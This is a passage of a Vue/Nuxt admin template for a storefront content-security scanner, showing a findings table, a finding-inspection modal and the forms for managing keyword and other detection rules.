            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="itemsPerPage"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="searchQuery || filterContentType !== 'all' || filterStatus !== 'all' || filterSeverity !== 'all' || filterDetector !== 'all'"
              @click="resetFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Main Findings Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="scanResultColumns" 
          :data="paginatedFindings"
          empty-text="No security findings found"
          empty-description="No items match your active filters or search criteria."
          @row-click="openFindingDetail"
        >
          <!-- Status Cell -->
          <template #cell-status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' :
                item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 dark:text-orange-400 border-orange-500/30' :
                item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' :
                item.status === 'Resolved' ? 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30' :
                'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30'
              )"
            >
              <component :is="getStatusBadge(item.status).icon" class="w-3 h-3" />
              <span>{{ item.status }}</span>
            </span>
          </template>

          <!-- Type Cell -->
          <template #cell-contentType="{ item }">
            <div class="flex items-center gap-1.5 text-xs font-semibold text-foreground">
              <Package v-if="item.contentType === 'Product'" class="w-3.5 h-3.5 text-primary shrink-0" />
              <Layers v-else class="w-3.5 h-3.5 text-blue-500 shrink-0" />
              <span>{{ item.contentType }}</span>
            </div>
          </template>

          <!-- Content Entity Name Cell -->
          <template #cell-contentName="{ item }">
            <div class="space-y-0.5 min-w-0">
              <p class="text-xs font-bold text-foreground hover:text-primary transition-colors line-clamp-1">
                {{ item.contentName }}
              </p>
              <p class="text-[10px] text-muted-foreground font-mono truncate">
                ID: {{ item.contentId }} · /{{ item.contentSlug }}
              </p>
            </div>
          </template>

          <!-- Field Cell -->
          <template #cell-field="{ item }">
            <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
              {{ item.field }}
            </span>
          </template>

          <!-- Risk Score Cell -->
          <template #cell-riskScore="{ item }">
            <div class="flex items-center gap-2">
              <div class="w-12 h-2 bg-muted rounded-full overflow-hidden">
                <div 
                  :class="cn(
                    'h-full rounded-full',
                    item.riskScore >= 80 ? 'bg-rose-500' :
                    item.riskScore >= 50 ? 'bg-amber-500' : 'bg-emerald-500'
                  )"
                  :style="{ width: `${item.riskScore}%` }"
                ></div>
              </div>
              <span class="text-xs font-mono font-bold text-foreground">
                {{ item.riskScore }}
              </span>
            </div>
          </template>

          <!-- Findings Cell -->
          <template #cell-findings="{ item }">
            <div class="space-y-0.5">
              <p class="text-xs font-medium text-foreground line-clamp-1">
                {{ item.description }}
              </p>
              <div class="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
                <span class="font-bold text-rose-500 dark:text-rose-400">Match:</span>
                <span class="truncate max-w-[200px] bg-rose-500/10 px-1 rounded text-rose-600 dark:text-rose-400">
                  {{ item.matchedValue }}
                </span>
              </div>
            </div>
          </template>

          <!-- Scanned At Cell -->
          <template #cell-scannedAt="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ item.scannedAt }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openFindingDetail(item)"
                class="px-2.5 py-1 text-xs font-bold text-primary hover:bg-primary/10 rounded-lg transition-colors"
                title="View detailed finding"
              >
                Inspect
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <UiPagination 
          :current-page="currentPage"
          :total-pages="totalPages"
          :total-count="filteredFindings.length"
          :items-per-page="itemsPerPage"
          item-label="findings"
          @update:current-page="currentPage = $event"
        />
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 3: DETECTION RULES TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'rules'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Sub-Tabs for Detection Rules -->
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-3">
        <div class="flex items-center gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
          <button 
            v-for="sub in visibleSubTabs"
            :key="sub.id"
            @click="rulesSubTab = sub.id as any"
            :class="cn(
              'px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5',
              rulesSubTab === sub.id 
                ? 'bg-primary text-primary-foreground shadow-sm' 
                : 'text-muted-foreground hover:text-foreground hover:bg-muted'
            )"
          >
            <span>{{ sub.label }}</span>
            <span 
              :class="cn(
                'px-1.5 py-0.2 rounded-full text-[10px] font-bold',
                rulesSubTab === sub.id ? 'bg-primary-foreground/20 text-primary-foreground' : 'bg-muted text-muted-foreground'
              )"
            >
              {{ sub.count }}
            </span>
          </button>
        </div>

        <UiButton 
          v-if="rulesSubTab !== 'keywords' || hasPermission('content_security.add_keywordrule')"
          @click="openAddRuleModal(
            rulesSubTab === 'keywords' ? 'keyword' :
            rulesSubTab === 'domains' ? 'domain' :
            rulesSubTab === 'html' ? 'html' :
            rulesSubTab === 'attributes' ? 'attribute' : 'redirect'
          )"
          size="sm"
          class="h-9 px-4 gap-1.5 font-bold text-xs shrink-0"
        >
          <Plus class="w-3.5 h-3.5" />
          <span>Add {{ 
            rulesSubTab === 'keywords' ? 'Keyword' :
            rulesSubTab === 'domains' ? 'Domain' :
            rulesSubTab === 'html' ? 'HTML Tag' :
            rulesSubTab === 'attributes' ? 'Attribute' : 'Redirect Rule'
          }}</span>
        </UiButton>
      </div>

      <!-- Keywords Subtab Specific Filters & Table -->
      <div v-if="rulesSubTab === 'keywords'" class="space-y-4">
        <!-- Keyword Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="keywordSearchQuery"
                type="text" 
                placeholder="Search keywords..." 
                class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
              />
              <button 
                v-if="keywordSearchQuery" 
                @click="keywordSearchQuery = ''"
                class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filters Dropdowns Row -->
            <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="keywordCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="keywordSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Match Type Filter -->
              <select 
                v-model="keywordMatchType"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Match Types</option>
                <option value="SUBSTRING">Substring</option>
                <option value="WORD">Word</option>
              </select>

              <!-- Is Active Filter -->
              <select 
                v-model="keywordIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Is Enabled Filter -->
              <select 
                v-model="keywordIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="keywordOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="keyword">Keyword (A-Z)</option>
                <option value="-keyword">Keyword (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2.5 shrink-0">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model="keywordPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Button -->
              <button 
                v-if="keywordSearchQuery || keywordCategory !== 'all' || keywordSeverity !== 'all' || keywordMatchType !== 'all' || keywordIsActive !== 'all' || keywordIsEnabled !== 'all'"
                @click="resetKeywordFilters"
                class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
                title="Reset keyword filters"
              >
                Reset
              </button>
            </div>
          </div>
        </div>

        <!-- Keyword Rules Table Wrapper -->
        <div v-if="!canViewKeywords" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security keyword rules.</p>
        </div>
        <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
          <!-- Loading state -->
          <div v-if="isKeywordsLoading" class="p-12 text-center space-y-3">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-xs text-muted-foreground">Loading keyword rules from security registry...</p>
          </div>
          <!-- Error state -->
          <div v-else-if="keywordsError" class="p-12 text-center space-y-3 text-rose-500">
            <ShieldAlert class="w-8 h-8 mx-auto" />
            <p class="text-sm font-semibold">Failed to Retrieve Keyword Rules</p>
            <p class="text-xs text-muted-foreground">{{ keywordsError }}</p>
            <UiButton size="sm" @click="fetchKeywordRules" class="mt-2">Retry</UiButton>
          </div>
          <!-- Table state -->
          <div v-else>
            <UiTable 
              :columns="keywordRuleColumns" 
              :data="keywordRulesData"
              empty-text="No keyword rules found"
              empty-description="No items match your active rules query."
            >
              <!-- Keyword Cell -->
              <template #cell-keyword="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.keyword }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Match Type Cell -->
              <template #cell-match_type="{ item }">
                <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
                  {{ item.match_type }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewKeywords"
                    @click.stop="openKeywordViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View keyword rule details"
                    aria-label="View keyword rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditKeywordRule"
                    @click.stop="openEditKeywordRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit keyword rule"
                    aria-label="Edit keyword rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteKeywordRule"
                    @click.stop="openDeleteKeywordRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete keyword rule"
                    aria-label="Delete keyword rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="keywordRulesCount > 0"
              :current-page="keywordPage"
              :total-pages="keywordRulesPages"
              :total-count="keywordRulesCount"
              :items-per-page="keywordPageSize"
              item-label="keyword rules"
              @update:current-page="keywordPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Non-Keywords Rules (Domains, HTML, Attributes, Redirects) original fallback -->
      <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <div class="divide-y divide-border">
          <div 
            v-for="rule in filteredRules" 
            :key="rule.id"
            class="p-4 sm:p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 hover:bg-muted/20 transition-colors"
          >
            <div class="space-y-1 min-w-0">
              <div class="flex items-center gap-2.5 flex-wrap">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ rule.pattern }}
                </span>
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(rule.severity))">
                  {{ rule.severity }}
                </span>
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ rule.category }}
                </span>
              </div>
              <p class="text-xs text-muted-foreground leading-relaxed">
                {{ rule.description }}
              </p>
              <div class="flex items-center gap-3 text-[11px] text-muted-foreground font-mono pt-1">
                <span>Rule ID: {{ rule.id }}</span>
                <span>•</span>
                <span>Matches Caught: <strong class="text-foreground">{{ rule.matchCount }}</strong></span>
                <span>•</span>
                <span>Updated: {{ rule.updatedAt }}</span>
              </div>
            </div>

            <!-- Rule Actions -->
            <div class="flex items-center gap-2 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50 justify-between sm:justify-end">
              <!-- Enable / Disable Switch -->
              <button 
                @click="toggleRuleStatus(rule)"
                :class="cn(
                  'px-3 py-1.5 rounded-xl text-xs font-bold border transition-colors flex items-center gap-1.5 cursor-pointer',
                  rule.enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
                :title="rule.enabled ? 'Click to disable' : 'Click to enable'"
              >
                <div :class="cn('w-2 h-2 rounded-full', rule.enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></div>
                <span>{{ rule.enabled ? 'Active' : 'Disabled' }}</span>
              </button>

              <button 
                @click="openEditRuleModal(rule)"
                class="p-2 rounded-xl text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
                title="Edit rule"
              >
                <Edit3 class="w-4 h-4" />
              </button>

              <button 
                @click="deleteRule(rule)"
                class="p-2 rounded-xl text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors"
                title="Delete rule"
              >
                <Trash2 class="w-4 h-4" />
              </button>
            </div>
          </div>

          <div v-if="filteredRules.length === 0" class="p-8 text-center text-muted-foreground space-y-2">
            <Code2 class="w-8 h-8 mx-auto text-muted-foreground/50" />
            <p class="text-sm font-semibold">No rules configured in this section.</p>
            <p class="text-xs">Click the Add Rule button above to create one.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- MODAL: FINDING DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isDetailModalOpen"
      :title="`Security Inspection: ${selectedFinding?.id || ''}`"
      :subtitle="`${selectedFinding?.contentType} Content Payload Analysis`"
      max-width="max-w-3xl"
      @close="closeFindingDetail"
    >
      <div v-if="selectedFinding" class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Overview Banner -->
        <div class="bg-muted/40 border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div class="space-y-1 min-w-0">
            <div class="flex items-center gap-2">
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                  selectedFinding.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/30' :
                  selectedFinding.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/30' :
                  selectedFinding.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/30' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30'
                )"
              >
                {{ selectedFinding.status }}
              </span>
              <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFinding.severity))">
                {{ selectedFinding.severity }} Severity
              </span>
            </div>
            <h3 class="text-base font-bold text-foreground truncate">
              {{ selectedFinding.contentName }}
            </h3>
            <p class="text-xs text-muted-foreground font-mono">
              Target Field: <strong class="text-foreground">{{ selectedFinding.field }}</strong> (Line ~{{ selectedFinding.lineOffset }})
            </p>
          </div>

          <div class="flex sm:flex-col items-center sm:items-end justify-between gap-1 shrink-0 bg-card p-3 rounded-xl border border-border">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Threat Score</span>
            <span 
              :class="cn(
                'text-2xl font-display font-extrabold font-mono',
                selectedFinding.riskScore >= 80 ? 'text-rose-600 dark:text-rose-400' :
                selectedFinding.riskScore >= 50 ? 'text-amber-600 dark:text-amber-400' : 'text-emerald-600 dark:text-emerald-400'
              )"
            >
              {{ selectedFinding.riskScore }}<span class="text-xs text-muted-foreground font-normal">/100</span>
            </span>
          </div>
        </div>

        <!-- Detection Assessment -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Detection Assessment
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-2">
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Detector Engine:</span>
              <span class="text-foreground font-bold">{{ selectedFinding.detector }} Detector</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Triggered Rule:</span>
              <span class="text-foreground font-mono text-[11px] bg-muted px-2 py-0.5 rounded">{{ selectedFinding.ruleName }}</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Inspection Timestamp:</span>
              <span class="text-muted-foreground font-mono text-[11px]">{{ selectedFinding.scannedAt }}</span>
            </div>
            <p class="text-xs text-foreground font-medium pt-2 border-t border-border/60">
              {{ selectedFinding.description }}
            </p>
          </div>
        </div>

        <!-- Content Context Snippet with Highlight -->
        <div class="space-y-2">
          <div class="flex items-center justify-between">
            <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
              Code & Content Context Snippet
            </h4>
            <span class="text-[10px] font-mono text-muted-foreground">
              Offset line {{ selectedFinding.lineOffset }}
            </span>
          </div>
          
          <div class="bg-slate-950 text-slate-100 rounded-xl p-4 font-mono text-xs leading-relaxed border border-slate-800 overflow-x-auto">
            <span class="text-slate-400">{{ selectedFinding.contextSnippetBefore }}</span>
            <mark class="bg-rose-500/30 text-rose-300 font-bold px-1.5 py-0.5 rounded border border-rose-500/50">
              {{ selectedFinding.contextSnippetMatched }}
            </mark>
            <span class="text-slate-400">{{ selectedFinding.contextSnippetAfter }}</span>
          </div>

          <div class="bg-muted/50 p-3 rounded-xl border border-border flex items-center justify-between text-xs">
            <span class="text-muted-foreground">Flagged String:</span>
            <code class="text-rose-600 dark:text-rose-400 font-bold font-mono text-[11px] truncate max-w-[360px]">
              {{ selectedFinding.matchedValue }}
            </code>
          </div>
        </div>

        <!-- Related Content Navigation Workflow -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Remediation & Content Navigation
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-3">
            <div class="flex items-center justify-between text-xs">
              <span class="text-muted-foreground">Target Entity:</span>
              <span class="font-bold text-foreground">{{ selectedFinding.contentName }}</span>
            </div>

            <div class="flex items-center gap-3 pt-2">
              <a 
                :href="selectedFinding.storefrontUrl" 
                target="_blank" 
                class="flex-1 h-9 px-3 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 border border-border transition-colors"
              >
                <ExternalLink class="w-3.5 h-3.5" />
                <span>View on Storefront</span>
              </a>

              <NuxtLink 
                :to="selectedFinding.adminEditUrl"
                class="flex-1 h-9 px-3 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition-colors shadow-xs"
              >
                <Edit3 class="w-3.5 h-3.5" />
                <span>Edit in Admin</span>
              </NuxtLink>
            </div>
            
            <p class="text-[11px] text-muted-foreground text-center italic">
              Workflow: Finding → View/Edit Content → Sanitize/Fix → Trigger Rescan
            </p>
          </div>
        </div>

        <!-- Action Controls -->
        <div class="pt-4 border-t border-border flex flex-col sm:flex-row items-center justify-between gap-3">
          <div class="flex items-center gap-2 w-full sm:w-auto">
            <button 
              @click="markFindingAsSafe(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Mark as Safe
            </button>
            <button 
              @click="confirmFindingSuspicious(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Confirm Threat
            </button>
          </div>

          <div class="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button 
              @click="rescanFinding(selectedFinding)"
              :disabled="isRescanningItem"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-muted hover:bg-muted/80 text-foreground border border-border rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-1.5"
            >
              <RotateCcw :class="cn('w-3.5 h-3.5', isRescanningItem && 'animate-spin')" />
              <span>{{ isRescanningItem ? 'Rescanning...' : 'Rescan Entity' }}</span>
            </button>

            <button 
              @click="resolveFinding(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors shadow-xs"
            >
              Resolve Issue
            </button>
          </div>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: ADD / EDIT DETECTION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isRuleModalOpen"
      :title="editingRule ? `Edit Rule: ${editingRule.id}` : (ruleForm.type === 'keyword' ? 'Create Keyword Rule' : 'Create Security Detection Rule')"
      :subtitle="ruleForm.type === 'keyword' && !editingRule ? 'Define keyword pattern heuristics for content security inspection.' : 'Define pattern heuristics for automated catalog inspection.'"
      max-width="max-w-lg"
      @close="isRuleModalOpen = false"
    >
      <!-- Keyword Rule Create Form (Real API) -->
      <form v-if="ruleForm.type === 'keyword' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordCreateForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordCreateForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordCreateForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordCreateForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordRule"
